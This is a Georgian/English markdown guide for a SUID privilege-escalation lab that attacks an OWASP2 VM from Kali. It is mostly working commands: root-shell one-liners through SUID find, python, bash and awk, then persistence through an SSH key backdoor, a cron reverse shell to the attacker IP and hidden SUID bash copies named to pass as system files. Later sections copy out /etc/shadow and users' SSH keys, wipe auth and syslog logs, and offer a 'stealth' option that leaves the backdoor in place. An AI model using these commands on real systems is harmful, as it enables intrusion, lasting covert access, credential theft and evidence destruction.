# SUID Privilege Escalation Lab 🎯
**Attacker:** Kali Linux (172.16.52.219)  
**Target:** OWASP2 VM (172.16.50.72)

---

## Phase 1: Target მომზადება (OWASP2 VM - 172.16.50.72)

### STEP 1: SUID ბინარების შექმნა (Root მომხმარებლით)

```bash
# SSH Target-ში (root-ით ან sudo user-ით)
ssh root@172.16.50.72

# 1) Find ბინარის კოპირება (ყველაზე საიმედო)
cp /usr/bin/find /tmp/vuln_find
chmod 4755 /tmp/vuln_find
chown root:root /tmp/vuln_find

# 2) Python ბინარის კოპირება  
cp /usr/bin/python3 /tmp/vuln_python
chmod 4755 /tmp/vuln_python
chown root:root /tmp/vuln_python

# 3) Bash ბინარის კოპირება
cp /bin/bash /tmp/vuln_bash  
chmod 4755 /tmp/vuln_bash
chown root:root /tmp/vuln_bash

# 4) AWK ბინარის კოპირება
cp /usr/bin/awk /tmp/vuln_awk
chmod 4755 /tmp/vuln_awk  
chown root:root /tmp/vuln_awk
```

### STEP 2: Test User შექმნა

```bash
# Target OWASP2-ზე (root-ით)
useradd -m -s /bin/bash hackme
echo "hackme:password123" | chpasswd

# /tmp დირექტორიის უფლებები
chmod 777 /tmp

# დადასტურება
ls -la /tmp/vuln_*
# უნდა ვნახოთ: -rwsr-xr-x 1 root root
```

---

## Phase 2: Initial Access (Kali - 172.16.52.219)

### STEP 1: Target-ში შესვლა როგორც Low-Privilege User

```bash
# Kali Terminal
ssh hackme@172.16.50.72
# Password: password123

# ან old SSH algorithms-ით თუ საჭიროა
ssh -oHostKeyAlgorithms=+ssh-rsa hackme@172.16.50.72
```

### STEP 2: პირველადი Enumeration

```bash
# Target OWASP2-ზე (hackme user)
whoami
# Output: hackme

id
# Output: uid=1001(hackme) gid=1001(hackme) groups=1001(hackme)

# Sudo უფლებების შემოწმება
sudo -l
# Likely: Sorry, user hackme may not run sudo...

# System info
uname -a
hostname
```

---

## Phase 3: SUID Discovery & Exploitation 💥

### STEP 1: SUID ბინარების მოძებნა

```bash
# Target OWASP2-ზე (hackme user)
find / -perm -4000 -type f 2>/dev/null | grep tmp
# მოსალოდნელი output:
# /tmp/vuln_find
# /tmp/vuln_python  
# /tmp/vuln_bash
# /tmp/vuln_awk

# Verification
ls -la /tmp/vuln_*
```

### STEP 2: Exploitation - Method 1 (Find) 🎯

```bash
# Target OWASP2-ზე (hackme user)
/tmp/vuln_find . -exec /bin/bash -p \; -quit

# Root shell მიღების შემდეგ
whoami
# Output: root

id  
# Output: uid=0(root) gid=0(root) groups=0(root)
```

### STEP 3: Exploitation - Method 2 (Python) 🐍

```bash
# თუ find არ იმუშავა
/tmp/vuln_python -c "import os; os.setuid(0); os.system('/bin/bash -p')"

# ან
/tmp/vuln_python -c "import os; os.execl('/bin/bash', 'bash', '-p')"
```

### STEP 4: Exploitation - Method 3 (Bash) 💥

```bash
# თუ python არ იმუშავა  
/tmp/vuln_bash -p

# -p flag ინარჩუნებს privileged mode-ს
```

### STEP 5: Exploitation - Method 4 (AWK) ⚡

```bash
# თუ bash არ იმუშავა
/tmp/vuln_awk 'BEGIN {system("/bin/bash -p")}'

# ან  
echo | /tmp/vuln_awk '{system("/bin/bash -p")}'
```

---

## Phase 4: Persistence Setup 🔒

### Method 1: SSH Key Backdoor

```bash
# Target OWASP2-ზე (root shell)
mkdir -p /root/.ssh
chmod 700 /root/.ssh

# Kali Terminal (ახალი tab/window)
ssh-keygen -t rsa -b 4096 -f /tmp/owasp2_key
# არ შეიყვანო passphrase

# Public key-ის ნახვა
cat /tmp/owasp2_key.pub

# Target-ზე უკან (root shell)  
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQ..." >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# Test Kali-დან
ssh -i /tmp/owasp2_key root@172.16.50.72
```

### Method 2: Reverse Shell Persistence

```bash
# Kali-ზე Listener გაშვება
nc -lvnp 4444

# Target OWASP2-ზე (root shell)
echo "*/2 * * * * /bin/bash -i >& /dev/tcp/172.16.52.219/4444 0>&1" > /tmp/cron_job
crontab /tmp/cron_job

# Verification
crontab -l
# Output: */2 * * * * /bin/bash -i >& /dev/tcp/172.16.52.219/4444 0>&1

# 2 წუთის შემდეგ Kali listener-ზე მივიღებთ connection-ს
```

### Method 3: Permanent SUID Backdoor

```bash
# Target OWASP2-ზე (root shell)
cp /bin/bash /var/tmp/.hidden_root
chmod 4755 /var/tmp/.hidden_root  
chown root:root /var/tmp/.hidden_root

# Hidden location-ში დამალვა
cp /bin/bash /usr/lib/.systemd-private
chmod 4755 /usr/lib/.systemd-private
chown root:root /usr/lib/.systemd-private

# Access test (როგორც hackme user)
/var/tmp/.hidden_root -p
whoami
# Output: root
```

---

## Phase 5: Post-Exploitation Activities 🕵️

### Method 1: Data Exfiltration

```bash
# Target OWASP2-ზე (root shell)
# მნიშვნელოვანი ფაილების კოპირება
cp /etc/shadow /tmp/shadow_backup
cp /etc/passwd /tmp/passwd_backup  
tar -czf /tmp/system_backup.tar.gz /etc/passwd /etc/shadow /home/*/.ssh/

# Kali-ზე მიღება
scp -i /tmp/owasp2_key root@172.16.50.72:/tmp/system_backup.tar.gz ./
```

### Method 2: Network Scanning from Inside

```bash
# Target OWASP2-ზე (root shell) 
# Internal network discovery
ip route
arp -a
netstat -tuln

# Port scanning local services
ss -tuln | grep LISTEN
```

---

## Phase 6: Cleanup & Stealth 🧹

### Option 1: სრული გასუფთავება

```bash
# Target OWASP2-ზე (root shell)
# SUID ბინარების წაშლა
rm -f /tmp/vuln_*

# Cron jobs წაშლა  
crontab -r

# SSH keys წაშლა
rm -f /root/.ssh/authorized_keys

# Backdoors წაშლა
rm -f /var/tmp/.hidden_root
rm -f /usr/lib/.systemd-private  

# Test user წაშლა
userdel -r hackme

# Logs გასუფთავება  
echo > /var/log/auth.log
echo > /var/log/syslog
history -c
```

### Option 2: Stealth Persistence (არ წავშალოთ ყველაფერი)

```bash
# მხოლოด SUID ბინარების წაშლა
rm -f /tmp/vuln_*

# Hidden backdoor დატოვება
# /usr/lib/.systemd-private დარჩეს

# Cron job-ის შეცვლა უფრო stealth-ურად
echo "0 3 * * * /bin/bash -i >& /dev/tcp/172.16.52.219/4444 0>&1 >/dev/null 2>&1" | crontab -
```

---

## Lab Testing Checklist ✅

### Pre-Exploitation
- [ ] Target-ზე SUID ბინარები შექმნილია
- [ ] Test user (hackme) შექმნილია  
- [ ] SSH connection მუშაობს Kali-დან

### Exploitation  
- [ ] SUID ბინარების discovery
- [ ] Root shell მიღება find-ით
- [ ] Python method ტესტი
- [ ] Bash method ტესტი  
- [ ] AWK method ტესტი

### Persistence
- [ ] SSH key backdoor
- [ ] Reverse shell cron job  
- [ ] Hidden SUID backdoor

### Verification
- [ ] Kali-დან root SSH access
- [ ] Cron job reverse connection
- [ ] Hidden backdoor access

---

## გაუმჯობესებული Script Automation 🚀

### Target Setup Script (OWASP2-ზე გასაშვები)

```bash
#!/bin/bash
# setup_lab.sh - Target OWASP2-ზე გასაშვები

echo "[+] Setting up SUID Privilege Escalation Lab..."

# SUID ბინარების შექმნა
cp /usr/bin/find /tmp/vuln_find && chmod 4755 /tmp/vuln_find && chown root:root /tmp/vuln_find
cp /usr/bin/python3 /tmp/vuln_python && chmod 4755 /tmp/vuln_python && chown root:root /tmp/vuln_python  
cp /bin/bash /tmp/vuln_bash && chmod 4755 /tmp/vuln_bash && chown root:root /tmp/vuln_bash
cp /usr/bin/awk /tmp/vuln_awk && chmod 4755 /tmp/vuln_awk && chown root:root /tmp/vuln_awk

# Test user შექმნა
useradd -m -s /bin/bash hackme
echo "hackme:password123" | chpasswd

echo "[+] Lab setup complete!"
echo "[+] SSH: hackme@172.16.50.72 (password: password123)"
ls -la /tmp/vuln_*
```

ამ ლაბმა ნამდვილად უნდა იმუშაოს! **find** მეთოდი თითქმის ყოველთვის მუშაობს SUID exploitation-ისთვის. 🎯

სცადე პირველ რიგში **find method**:
```bash
/tmp/vuln_find . -exec /bin/bash -p \; -quit
```
